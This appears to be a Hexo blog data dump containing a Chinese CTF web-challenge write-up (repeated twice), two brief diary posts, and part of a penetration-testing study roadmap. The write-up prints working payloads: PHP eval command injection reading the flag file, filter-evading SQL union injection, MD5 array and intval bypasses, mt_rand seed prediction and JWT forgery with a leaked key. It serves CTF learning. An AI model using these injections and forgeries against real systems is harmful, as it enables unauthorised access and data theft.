src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.34.04.png\"><br>审计发现通过word传参命令执行，过滤flag字段。</p>\n<h3 id=\"通配符绕过\"><a href=\"#通配符绕过\" class=\"headerlink\" title=\"通配符绕过\"></a>通配符绕过</h3><p><code>?word=system(&quot;cat /f*&quot;);</code><br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.37.01.png\"></p>\n<h2 id=\"Ez-SQL\"><a href=\"#Ez-SQL\" class=\"headerlink\" title=\"Ez_SQL\"></a>Ez_SQL</h2><h3 id=\"手工做法：\"><a href=\"#手工做法：\" class=\"headerlink\" title=\"手工做法：\"></a>手工做法：</h3><h4 id=\"查看源码有提示\"><a href=\"#查看源码有提示\" class=\"headerlink\" title=\"查看源码有提示\"></a>查看源码有提示</h4><p>提示将select替换为空。<br>绕过办法：分拆绕过，过滤时重组形成payload</p>\n<h4 id=\"构造语句\"><a href=\"#构造语句\" class=\"headerlink\" title=\"构造语句\"></a>构造语句</h4><p>先order by 确定一下字段数，<br><code>username=123&#39;order by 4--+</code><br>发现字段为4。使用hackerbar辅助构造payload<br><code>username=123&#39;union selselectect group_concat(schema_name),2,3,4 from information_schema.schemata-+</code><br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.46.22.png\"><br>然后就使用相同方式构造注入语句拿下flag。</p>\n<h3 id=\"工具梭哈\"><a href=\"#工具梭哈\" class=\"headerlink\" title=\"工具梭哈\"></a>工具梭哈</h3><p>sqlmap一把梭，具体使用就自己查一查了哈。</p>\n<h2 id=\"哈斯哈斯哈斯（bt\"><a href=\"#哈斯哈斯哈斯（bt\" class=\"headerlink\" title=\"哈斯哈斯哈斯（bt\"></a>哈斯哈斯哈斯（bt</h2><p>1azy_fish觉得md5很好用，就用一堆md5保护了flag，使它不被坏人拿走。</p>\n<h3 id=\"弱口令\"><a href=\"#弱口令\" class=\"headerlink\" title=\"弱口令\"></a>弱口令</h3><p>开局一个登录框，弱口令是试一下，得到：<br>admin:admin</p>\n<h3 id=\"查看源码-传参\"><a href=\"#查看源码-传参\" class=\"headerlink\" title=\"查看源码+传参\"></a>查看源码+传参</h3><p>跳转后页面看看源码得到提示。<br><code>你给我hint我给你hint</code><br>猜测传参hint。</p>\n<h3 id=\"php审计\"><a href=\"#php审计\" class=\"headerlink\" title=\"php审计\"></a>php审计</h3><p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.55.11.png\"></p>\n<pre><code class=\"php\">&lt;?php  \nerror_reporting(0);  \nrequire_once(&#39;/flag.php&#39;);   \nif(isset($_GET[&#39;hint&#39;]))&#123;    highlight_file(__FILE__);  \n&#125;  \nelse&#123;  \n    include_once &quot;loginok.html&quot;;  \n&#125;  \n$a=$_GET[&#39;a&#39;];  \n$b=$_GET[&#39;b&#39;];  \n$hash=$_COOKIE[&#39;hash&#39;];  \n$word=$_POST[&#39;word&#39;];  \nif($a !== $b &amp; md5($a) === md5($b))&#123;  \n    echo &#39; WOW,u are so cool &#39;;  \n    echo strlen($flag);  \n&#125;  \nif (preg_match(&#39;/^1952(.*?)NUAA$/&#39;, $word))&#123;  \n    if(intval($word) === intval(strrev($word)))&#123;  \n        echo &quot; 宝贝,flag快出来了哦,加油捏 &quot;;  \n        echo md5($flag);  \n    &#125;  \n&#125;  \nif ($hash === md5($flag . $word))  \n      echo &quot; Wooooooo!You cracked the md5. Here is your flag &quot; . $flag;  \n?&gt;\n</code></pre>\n<pre><code class=\"php\">大概有三层判断：\n1`.if($a !== $b &amp; md5($a) === md5($b))&#123;`\n2`.`if (preg_match(&#39;/^1952(.*?)NUAA$/&#39;, $word))&#123;  \n    if(intval($word) === intval(strrev($word)))&#123;``\n3`.if ($hash === md5($flag . $word))`\n</code></pre>\n<h3 id=\"1-值不相同但md5加密后相同（数组绕过md5强比较）\"><a href=\"#1-值不相同但md5加密后相同（数组绕过md5强比较）\" class=\"headerlink\" title=\"1. 值不相同但md5加密后相同（数组绕过md5强比较）\"></a>1. 值不相同但md5加密后相同（数组绕过md5强比较）</h3><ul>\n<li>通过数组类型一致，但值不一致。</li>\n<li>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</li>\n<li>中间的为什么是&amp;而不是&amp;&amp;。在此题当中都是成立的，详细的说明可以查看<a href=https://www.runoob.com/note/34429>菜鸟教程</a></li>\n</ul>\n<h3 id=\"2-1952开头NUAA结尾，倒序并interval-后仍相同\"><a href=\"#2-1952开头NUAA结尾，倒序并interval-后仍相同\" class=\"headerlink\" title=\"2.1952开头NUAA结尾，倒序并interval()后仍相同\"></a>2.1952开头NUAA结尾，倒序并interval()后仍相同</h3><ul>\n<li>正常进行输入的情况如下： <img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2020.54.27.png\"><br>相关定义可以自己去查一下（我懒）</li>\n</ul>\n<p>大概思路: 正序的字符串比较好控制大小，而倒序的感觉有点难办。<br>小trick：科学计数法<br>我们可以通过科学计数法使得正向的字符串经过intval后变为0也就实现了绕过。</p>\n<p>payload:<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.05.58.png\"></p>\n<p>得到md5值</p>\n<h3 id=\"3-word置空进行绕过。\"><a href=\"#3-word置空进行绕过。\" class=\"headerlink\" title=\"3.word置空进行绕过。\"></a>3.word置空进行绕过。</h3><p>这里就不要想的太复杂哈哈哈哈哈哈哈。还得是小小姐。<br>word参数直接置空并且加上hash就可以得到flag了。</p>\n<p>下班！</p>\n<h2 id=\"伤身体（ssti\"><a href=\"#伤身体（ssti\" class=\"headerlink\" title=\"伤身体（ssti\"></a>伤身体（ssti</h2><p>1azy_fish沉迷于某六字游戏，在他大意的时候，快偷了他的flag！！！</p>\n<h3 id=\"弱口令登入\"><a href=\"#弱口令登入\" class=\"headerlink\" title=\"弱口令登入\"></a>弱口令登入</h3><p>admin:password</p>\n<h3 id=\"ssti注入\"><a href=\"#ssti注入\" class=\"headerlink\" title=\"ssti注入\"></a>ssti注入</h3><p>ssti注入我就大概知道个原理，于是呢就直接工具梭哈啦。<br>打开fenjing直接一把嗦，具体用法自己查一下吧。</p>\n<h2 id=\"来抽个奖？\"><a href=\"#来抽个奖？\" class=\"headerlink\" title=\"来抽个奖？\"></a>来抽个奖？</h2><p>1azy_fish觉得有随机数在，他就不会亏卡，快爆了他，让他血本无归。</p>\n<h4 id=\"php伪随机数漏洞\"><a href=\"#php伪随机数漏洞\" class=\"headerlink\" title=\"php伪随机数漏洞\"></a>php伪随机数漏洞</h4><p>多次刷新发现随机数始终相同，于是猜测肯定使用的同一个种子。漏洞请往下翻翻。</p>\n<h3 id=\"爆破种子\"><a href=\"#爆破种子\" class=\"headerlink\" title=\"爆破种子\"></a>爆破种子</h3><p>爆破种子工具包 <a href=https://github.com/openwall/php_mt_seed>php_mt_seed</a><br>使用教程看看README就行。</p>\n<h3 id=\"漏洞了解\"><a href=\"#漏洞了解\" class=\"headerlink\" title=\"漏洞了解\"></a>漏洞了解</h3><p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.21.05.png\"></p>\n<pre><code class=\"php\">&lt;?php  \nmt_srand(5201314);  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \n?&gt;\n</code></pre>\n<p>可以通过多次实验发现相同种子下，都是相同的数据，相同的顺序。</p>\n<p>下班！</p>\n<h2 id=\"我不是op！\"><a href=\"#我不是op！\" class=\"headerlink\" title=\"我不是op！\"></a>我不是op！</h2><p>1azy_fish说他自己不是op，你可以登录它的管理员账号看看他到底是不是op吗？</p>\n<p>尝试弱口令无果后随便打一个用户名，发现返回包<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.01.55.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.02.06.png\"><br>得到token一眼jwt，同时解编码message上面的unicode<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.03.32.png\"><br>然后带这个token去&#x2F;protected<br>需要注意的点（这个token是jwt，需要放在cookie里面进行传参）<br>使用GET请求</p>\n<p>构造后的burp请求包：<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.07.12.png\"></p>\n<pre><code>GET http://101.42.30.15:8306/protected HTTP/1.1\nHost: 101.42.30.15:8306\nPragma: no-cache\nCache-Control: no-cache  \nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\\*/\\*;q=0.8,application/signed-exchange;v=b3;q=0.7   \nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: session=7fa98980-e33f-4e0b-9213-4c1616d16f94.62XYmGmHDaMHpnRNYQEY--rTTK0; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyJ9.ATUoxudr6sa0eNyMUQqU155AeGVsuv90_CM-T_WVlKM\nsec-ch-ua-platform: &quot;Windows&quot;\nsec-ch-ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot; \nsec-ch-ua-mobile: ?0\nConnection: close\n</code></pre>\n<p>返回包里<br><code>&lt;!--secret_key = &quot;Lazy_fish_Is_op?&quot;--&gt;</code><br>应该就是jwt的密钥了<br>于是直接找个在线jwt网站篡改一下jwt就可以越权到admin了(网站： <a href=\"https://jwt.io/\">https://jwt.io/</a>)<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.12.01.png\"><br>直接修改111为admin然后得到admin的 jwt<br>带这admin的jwt重新访问即可得到flag<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.13.50.png\"></p>\n<p>Shark{1aZyfish_is_0pppppppppp!}</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>暑假事情有点多，没啥时间写，只写完了web题，写篇wp水水博客。</code></p>\n<hr>\n<h2 id=\"彩蛋\"><a href=\"#彩蛋\" class=\"headerlink\" title=\"彩蛋\"></a>彩蛋</h2><p>1azy_fish加了彩蛋，找一找？不用爆破（把服务器日坏了就不好玩了</p>\n<h3 id=\"敏感路径\"><a href=\"#敏感路径\" class=\"headerlink\" title=\"敏感路径\"></a>敏感路径</h3><p>这题刚开始看以为是F12题，一直没找到，后来翻插件发现有敏感目录 &#x2F;goat。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.09.03.png\"><br>推荐一下这个插件：findsomething（尊嘟很好用）</p>\n<h3 id=\"F12查看网页源码\"><a href=\"#F12查看网页源码\" class=\"headerlink\" title=\"F12查看网页源码\"></a>F12查看网页源码</h3><p>直接拼接就是一个F12题了，F12查看源码得到flag<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.07.01.png\"></p>\n<h2 id=\"Ez-http\"><a href=\"#Ez-http\" class=\"headerlink\" title=\"Ez_http\"></a>Ez_http</h2><p>VidocQwQ说http好简单，我们一起学习吧。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.12.24.png\"></p>\n<h3 id=\"XFF头ip绕过\"><a href=\"#XFF头ip绕过\" class=\"headerlink\" title=\"XFF头ip绕过\"></a>XFF头ip绕过</h3><p>使用hackbar进行操作添加XFF头。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.15.43.png\"></p>\n<h3 id=\"Referer来源绕过\"><a href=\"#Referer来源绕过\" class=\"headerlink\" title=\"Referer来源绕过\"></a>Referer来源绕过</h3><p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.17.39.png\"></p>\n<h3 id=\"UA绕过\"><a href=\"#UA绕过\" class=\"headerlink\" title=\"UA绕过\"></a>UA绕过</h3><p>UA头一般用来确定浏览器类型<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.19.12.png\"></p>\n<h2 id=\"view-source\"><a href=\"#view-source\" class=\"headerlink\" title=\"view source\"></a>view source</h2><p>VidocQwQ邀请你一起打游戏辣，2048都会吧？</p>\n<h3 id=\"查看源码\"><a href=\"#查看源码\" class=\"headerlink\" title=\"查看源码\"></a>查看源码</h3><p>看题目意思应该是要查看源码，但是禁用了F12和右键。<br>不过可以通过谷歌浏览器的设置打开开发者工具<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.24.19.png\"><br>源码发现提示hint.php<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.25.33.png\"></p>\n<h3 id=\"源码查询发现路由及参数\"><a href=\"#源码查询发现路由及参数\" class=\"headerlink\" title=\"源码查询发现路由及参数\"></a>源码查询发现路由及参数</h3><p>直接拼接访问的话发现什么也没有。<br>于是回到前面查看源码，但是代码有点长。<br>于是猜测hint.php是否用以传递成绩参数之类的，全局搜索看看是否有暴露相关路由。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.30.16.png\"><br>发现相关源码，于是直接可以拼接获得flag<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.32.50.png\"></p>\n<h2 id=\"Ez-eval\"><a href=\"#Ez-eval\" class=\"headerlink\" title=\"Ez_eval\"></a>Ez_eval</h2><p>VidocQwQ写了个php，留下了一个函数，你们知道怎么使用吗？</p>\n<h3 id=\"开局送源码\"><a href=\"#开局送源码\" class=\"headerlink\" title=\"开局送源码\"></a>开局送源码</h3><p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.34.04.png\"><br>审计发现通过word传参命令执行，过滤flag字段。</p>\n<h3 id=\"通配符绕过\"><a href=\"#通配符绕过\" class=\"headerlink\" title=\"通配符绕过\"></a>通配符绕过</h3><p><code>?word=system(&quot;cat /f*&quot;);</code><br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.37.01.png\"></p>\n<h2 id=\"Ez-SQL\"><a href=\"#Ez-SQL\" class=\"headerlink\" title=\"Ez_SQL\"></a>Ez_SQL</h2><h3 id=\"手工做法：\"><a href=\"#手工做法：\" class=\"headerlink\" title=\"手工做法：\"></a>手工做法：</h3><h4 id=\"查看源码有提示\"><a href=\"#查看源码有提示\" class=\"headerlink\" title=\"查看源码有提示\"></a>查看源码有提示</h4><p>提示将select替换为空。<br>绕过办法：分拆绕过，过滤时重组形成payload</p>\n<h4 id=\"构造语句\"><a href=\"#构造语句\" class=\"headerlink\" title=\"构造语句\"></a>构造语句</h4><p>先order by 确定一下字段数，<br><code>username=123&#39;order by 4--+</code><br>发现字段为4。使用hackerbar辅助构造payload<br><code>username=123&#39;union selselectect group_concat(schema_name),2,3,4 from information_schema.schemata-+</code><br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.46.22.png\"><br>然后就使用相同方式构造注入语句拿下flag。</p>\n<h3 id=\"工具梭哈\"><a href=\"#工具梭哈\" class=\"headerlink\" title=\"工具梭哈\"></a>工具梭哈</h3><p>sqlmap一把梭，具体使用就自己查一查了哈。</p>\n<h2 id=\"哈斯哈斯哈斯（bt\"><a href=\"#哈斯哈斯哈斯（bt\" class=\"headerlink\" title=\"哈斯哈斯哈斯（bt\"></a>哈斯哈斯哈斯（bt</h2><p>1azy_fish觉得md5很好用，就用一堆md5保护了flag，使它不被坏人拿走。</p>\n<h3 id=\"弱口令\"><a href=\"#弱口令\" class=\"headerlink\" title=\"弱口令\"></a>弱口令</h3><p>开局一个登录框，弱口令是试一下，得到：<br>admin:admin</p>\n<h3 id=\"查看源码-传参\"><a href=\"#查看源码-传参\" class=\"headerlink\" title=\"查看源码+传参\"></a>查看源码+传参</h3><p>跳转后页面看看源码得到提示。<br><code>你给我hint我给你hint</code><br>猜测传参hint。</p>\n<h3 id=\"php审计\"><a href=\"#php审计\" class=\"headerlink\" title=\"php审计\"></a>php审计</h3><p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.55.11.png\"></p>\n<pre><code class=\"php\">&lt;?php  \nerror_reporting(0);  \nrequire_once(&#39;/flag.php&#39;);   \nif(isset($_GET[&#39;hint&#39;]))&#123;    highlight_file(__FILE__);  \n&#125;  \nelse&#123;  \n    include_once &quot;loginok.html&quot;;  \n&#125;  \n$a=$_GET[&#39;a&#39;];  \n$b=$_GET[&#39;b&#39;];  \n$hash=$_COOKIE[&#39;hash&#39;];  \n$word=$_POST[&#39;word&#39;];  \nif($a !== $b &amp; md5($a) === md5($b))&#123;  \n    echo &#39; WOW,u are so cool &#39;;  \n    echo strlen($flag);  \n&#125;  \nif (preg_match(&#39;/^1952(.*?)NUAA$/&#39;, $word))&#123;  \n    if(intval($word) === intval(strrev($word)))&#123;  \n        echo &quot; 宝贝,flag快出来了哦,加油捏 &quot;;  \n        echo md5($flag);  \n    &#125;  \n&#125;  \nif ($hash === md5($flag . $word))  \n      echo &quot; Wooooooo!You cracked the md5. Here is your flag &quot; . $flag;  \n?&gt;\n</code></pre>\n<pre><code class=\"php\">大概有三层判断：\n1`.if($a !== $b &amp; md5($a) === md5($b))&#123;`\n2`.`if (preg_match(&#39;/^1952(.*?)NUAA$/&#39;, $word))&#123;  \n    if(intval($word) === intval(strrev($word)))&#123;``\n3`.if ($hash === md5($flag . $word))`\n</code></pre>\n<h3 id=\"1-值不相同但md5加密后相同（数组绕过md5强比较）\"><a href=\"#1-值不相同但md5加密后相同（数组绕过md5强比较）\" class=\"headerlink\" title=\"1. 值不相同但md5加密后相同（数组绕过md5强比较）\"></a>1. 值不相同但md5加密后相同（数组绕过md5强比较）</h3><ul>\n<li>通过数组类型一致，但值不一致。</li>\n<li>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</li>\n<li>中间的为什么是&amp;而不是&amp;&amp;。在此题当中都是成立的，详细的说明可以查看<a href=https://www.runoob.com/note/34429>菜鸟教程</a></li>\n</ul>\n<h3 id=\"2-1952开头NUAA结尾，倒序并interval-后仍相同\"><a href=\"#2-1952开头NUAA结尾，倒序并interval-后仍相同\" class=\"headerlink\" title=\"2.1952开头NUAA结尾，倒序并interval()后仍相同\"></a>2.1952开头NUAA结尾，倒序并interval()后仍相同</h3><ul>\n<li>正常进行输入的情况如下： <img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2020.54.27.png\"><br>相关定义可以自己去查一下（我懒）</li>\n</ul>\n<p>大概思路: 正序的字符串比较好控制大小，而倒序的感觉有点难办。<br>小trick：科学计数法<br>我们可以通过科学计数法使得正向的字符串经过intval后变为0也就实现了绕过。</p>\n<p>payload:<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.05.58.png\"></p>\n<p>得到md5值</p>\n<h3 id=\"3-word置空进行绕过。\"><a href=\"#3-word置空进行绕过。\" class=\"headerlink\" title=\"3.word置空进行绕过。\"></a>3.word置空进行绕过。</h3><p>这里就不要想的太复杂哈哈哈哈哈哈哈。还得是小小姐。<br>word参数直接置空并且加上hash就可以得到flag了。</p>\n<p>下班！</p>\n<h2 id=\"伤身体（ssti\"><a href=\"#伤身体（ssti\" class=\"headerlink\" title=\"伤身体（ssti\"></a>伤身体（ssti</h2><p>1azy_fish沉迷于某六字游戏，在他大意的时候，快偷了他的flag！！！</p>\n<h3 id=\"弱口令登入\"><a href=\"#弱口令登入\" class=\"headerlink\" title=\"弱口令登入\"></a>弱口令登入</h3><p>admin:password</p>\n<h3 id=\"ssti注入\"><a href=\"#ssti注入\" class=\"headerlink\" title=\"ssti注入\"></a>ssti注入</h3><p>ssti注入我就大概知道个原理，于是呢就直接工具梭哈啦。<br>打开fenjing直接一把嗦，具体用法自己查一下吧。</p>\n<h2 id=\"来抽个奖？\"><a href=\"#来抽个奖？\" class=\"headerlink\" title=\"来抽个奖？\"></a>来抽个奖？</h2><p>1azy_fish觉得有随机数在，他就不会亏卡，快爆了他，让他血本无归。</p>\n<h4 id=\"php伪随机数漏洞\"><a href=\"#php伪随机数漏洞\" class=\"headerlink\" title=\"php伪随机数漏洞\"></a>php伪随机数漏洞</h4><p>多次刷新发现随机数始终相同，于是猜测肯定使用的同一个种子。漏洞请往下翻翻。</p>\n<h3 id=\"爆破种子\"><a href=\"#爆破种子\" class=\"headerlink\" title=\"爆破种子\"></a>爆破种子</h3><p>爆破种子工具包 <a href=https://github.com/openwall/php_mt_seed>php_mt_seed</a><br>使用教程看看README就行。</p>\n<h3 id=\"漏洞了解\"><a href=\"#漏洞了解\" class=\"headerlink\" title=\"漏洞了解\"></a>漏洞了解</h3><p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.21.05.png\"></p>\n<pre><code class=\"php\">&lt;?php  \nmt_srand(5201314);  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \n?&gt;\n</code></pre>\n<p>可以通过多次实验发现相同种子下，都是相同的数据，相同的顺序。</p>\n<p>下班！</p>\n<h2 id=\"我不是op！\"><a href=\"#我不是op！\" class=\"headerlink\" title=\"我不是op！\"></a>我不是op！</h2><p>1azy_fish说他自己不是op，你可以登录它的管理员账号看看他到底是不是op吗？</p>\n<p>尝试弱口令无果后随便打一个用户名，发现返回包<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.01.55.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.02.06.png\"><br>得到token一眼jwt，同时解编码message上面的unicode<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.03.32.png\"><br>然后带这个token去&#x2F;protected<br>需要注意的点（这个token是jwt，需要放在cookie里面进行传参）<br>使用GET请求</p>\n<p>构造后的burp请求包：<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.07.12.png\"></p>\n<pre><code>GET http://101.42.30.15:8306/protected HTTP/1.1\nHost: 101.42.30.15:8306\nPragma: no-cache\nCache-Control: no-cache  \nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\\*/\\*;q=0.8,application/signed-exchange;v=b3;q=0.7   \nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: session=7fa98980-e33f-4e0b-9213-4c1616d16f94.62XYmGmHDaMHpnRNYQEY--rTTK0; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyJ9.ATUoxudr6sa0eNyMUQqU155AeGVsuv90_CM-T_WVlKM\nsec-ch-ua-platform: &quot;Windows&quot;\nsec-ch-ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot; \nsec-ch-ua-mobile: ?0\nConnection: close\n</code></pre>\n<p>返回包里<br><code>&lt;!--secret_key = &quot;Lazy_fish_Is_op?&quot;--&gt;</code><br>应该就是jwt的密钥了<br>于是直接找个在线jwt网站篡改一下jwt就可以越权到admin了(网站： <a href=\"https://jwt.io/\">https://jwt.io/</a>)<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.12.01.png\"><br>直接修改111为admin然后得到admin的 jwt<br>带这admin的jwt重新访问即可得到flag<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.13.50.png\"></p>\n<p>Shark{1aZyfish_is_0pppppppppp!}</p>\n"},{"title":"博客更新","date":"2023-08-22T03:29:41.000Z","_content":"今天早上更新了搜索栏和留言板。初步更新基本完成，后面就要开始更新我的水文啦。\n\n欢迎大家留言，指导指导小菜鸡哈（orz）。\n","source":"_posts/博客更新.md","raw":"---\ntitle: 博客更新\ndate: 2023-08-22 11:29:41\ntags:\n- blog\n---\n今天早上更新了搜索栏和留言板。初步更新基本完成，后面就要开始更新我的水文啦。\n\n欢迎大家留言，指导指导小菜鸡哈（orz）。\n","slug":"博客更新","published":1,"updated":"2023-08-22T03:58:34.991Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkzb00091ao59acy3h0b","content":"<p>今天早上更新了搜索栏和留言板。初步更新基本完成，后面就要开始更新我的水文啦。</p>\n<p>欢迎大家留言，指导指导小菜鸡哈（orz）。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天早上更新了搜索栏和留言板。初步更新基本完成，后面就要开始更新我的水文啦。</p>\n<p>欢迎大家留言，指导指导小菜鸡哈（orz）。</p>\n"},{"title":"日记","date":"2023-08-21T16:51:18.000Z","_content":"\n今天事情比较多，今日战绩：图床搭建完成。\n\n下班！","source":"_posts/日记.md","raw":"---\ntitle: 日记\ndate: 2023-08-22 00:51:18\ncategories:\n- Diary\ntags:\n- blog\n---\n\n今天事情比较多，今日战绩：图床搭建完成。\n\n下班！","slug":"日记","published":1,"updated":"2023-08-21T16:53:57.988Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkzc000c1ao5022t8o8z","content":"<p>今天事情比较多，今日战绩：图床搭建完成。</p>\n<p>下班！</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天事情比较多，今日战绩：图床搭建完成。</p>\n<p>下班！</p>\n"},{"title":"渗透测试入门","date":"2023-08-20T08:18:48.000Z","_content":"#入门\n\n练习时长：八周（3又五分之一坤周）\n\n# web开发入门（两周）\n\n**前端语言**:  HTML+CSS+javascript\n建议时长： 三天 （JS要求高，dom树看懂）\n\n**脚本语言** : python+网络基础和HTTP协议  \n建议时长：七天 \n\n**后端语言**:PHP+SQL+MySQL数据库 \n建议时长：三天（第一门后端语言建议php，因为比较简单，当然你也可以直接入手其他的语言java，go之类的）\n\n**学习方式**： 菜鸟教程进行速通上面的语言学习。\n\n**学习任务**：注册登录页面和登录成功展示静态百度页面\n\n\n# web渗透入门\n\n\n## 一、信息收集（三天）\n如子域名收集、备案查询、github 敏感信息查找等等，知道的方式越多，收集的信息也越多。\n详细文章： https://www.freebuf.com/articles/web/340195.html \n\n利用一些工具减轻工作量：\n1. 灯塔ARL   https://github.com/TophantTechnology/ARL\n魔改： https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw\n2. 水泽  https://github.com/0x727/ShuiZe_0x727\n\n\n## 二、常见漏洞利用（三周）\n对于入门级的渗透测试，可以先掌握 OWASP Top 10 的漏洞、如最常见的 SQL 注入漏洞、XSS 漏洞、文件上传漏洞、越权漏洞、弱口令等。\n\n看一些报告：\nedusrc:闲鱼上或者自己搜一搜，公众号也有很多文章\n乌云： https://wy.zone.ci/\nh1：同样建议搜一搜\n\n## 三、渗透测试常用工具使用。(两周)\n对于入门级的渗透测试，会使用 nmap、Burpsuite、Kali Linux 、sqlmap 就基本足够了。\n\n靶场：\n1. pikachu： https://github.com/zhuifengshaonianhanlu/pikachu\n2. vulhub： https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168896524816782425130413&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142^v88^control_2,239^v2^insert_chatgpt&utm_term=vulhub&spm=1018.2226.3001.4187 \n3. tryhackme: https://tryhackme.com/ (推荐)\n4. hackthebox： 